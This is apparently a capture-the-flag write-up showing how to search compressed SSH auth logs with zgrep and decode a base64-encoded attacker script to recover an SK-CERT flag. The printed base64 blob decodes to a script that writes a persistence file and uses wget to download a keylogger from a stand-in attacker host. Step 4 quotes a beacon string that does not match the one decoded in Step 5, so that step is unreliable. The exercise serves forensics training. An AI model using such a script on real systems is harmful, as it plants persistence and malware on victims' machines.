
# README: How I Viewed Compressed Logs and Found Hidden Flags

In this guide, I’ll walk you through how I searched compressed log files without extracting them, decoded a hidden base64 script I found inside, and uncovered secret flags left by an attacker.



## Step 1: Searching Inside Compressed Logs with `zgrep`

I didn’t want to extract all the `.gz` log files just to find a string, so I used `zgrep` to search directly inside them.

 I ran:

```bash
zgrep "Accepted password for" auth.log.*.gz
```

This showed me entries like:

```
auth.log.4.gz:Apr 18 15:34:49 a952d0d9ca03 sshd[2680]: Accepted password for ratchet from 172.30.185.17 port 46350 ssh2
```

---

## Step 2: Getting More Context Around Matches

To understand what was going on around the match, I wanted some lines before and after. I used `-B` and `-A` options:

```bash
zgrep -B 5 -A 15 "ratchet" auth.log.4.gz
```

This gave me 5 lines before and 15 lines after the string "ratchet," helping me see the bigger picture.

---

## Step 3: Finding and Decoding the Hidden Script

In the output, I found a suspicious-looking base64 string.

```IyEvYmluL3NoCmJlYWNvbj0iNjkyMDY4NmY3MDY1MjA3NDY4NjU3OTIwNzc2ZjZlNzQyMDY2Njk2ZTY0MjA2ZDY1MmMyMDYxNmU2NDIwNzQ2ODY5NzMyMDY2NmM2MTY3MjAyODUzNGIyZDQzNDU1MjU0N2I2ZTMzNzYzMzcyNWY2NjMwNzIzNjMzMzc1ZjM0NjIzMDc1Mzc1ZjY0MzQzNzVmNzAzMzcyMzUzMTM1MzczMzZlNjMzMzdkMjkyMDZiNjU2NTcwNzMyMDZmNmUyMDYyNjU2MTYzNmY2ZTY5NmU2NyIKZWNobyAiWyQoZGF0ZSldICQoZWNobyAkYmVhY29uIHwgeHhkIC1yIC1wKSIgPiAvdG1wL3BlcnNpc3RlbmNlCm1rZGlyIC1wIC92YXIvZGF0YQp3Z2V0IC1PIC92YXIvZGF0YS9rZXlsb2dnZXIuYmluICJodHRwOi8vY29tbWFuZC1jdWJlLmV2aWwva2V5bG9nZ2VyLmJpbiIK``` 

I saved it and decoded it like this:

```bash
echo "<base64_string>" | base64 -d > decoded_script.sh
```

When I checked the decoded file, it was a shell script.


## Step 4: What the Script Did

The script set a variable called `beacon` with a long hex string. It then converted that hex to text and wrote it with a timestamp into `/tmp/persistence`. It also created a directory and downloaded a suspicious file called `keylogger.bin`.

Here’s the core part of the script:

```bash
beacon="6920686f70652074686520776f726c6420666f7267657420666f7220746865206d6f6d656e7420776520686164206f6e206f7572207369646520616e64206c6175676865642061732077652064616e63656420696e20746865206c6967687420696e207468652070616c65206f66207065616365206265666f7265207468652066757279206f6620776172"
echo "[$(date)] $(echo $beacon | xxd -r -p)" > /tmp/persistence
```

---

## Step 5: Decoding the Hex Message Myself

I wanted to see what the beacon message said, so I ran:

```bash
echo "6920686f7065207468657920776f6e742066696e64206d652c20616e64207468697320666c61672028534b2d434552547b6e337633725f6630723633375f34623075375f6434375f70337235313537336e63337d29206b65657073206f6e20626561636f6e696e67" | xxd -r -p
```

It printed:

```
i hope they wont find me, and this flag (SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}) keeps on beaconing
```

---

## Step 6: Here’s the Flag I Found

```
SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}
```

---

## Summary

So in short:

* I used `zgrep` to search inside compressed logs without extracting them.
* I extracted and decoded a base64 script I found.
* I analyzed the script and decoded the hex message it contained.
* That message contained the flag I was looking for!
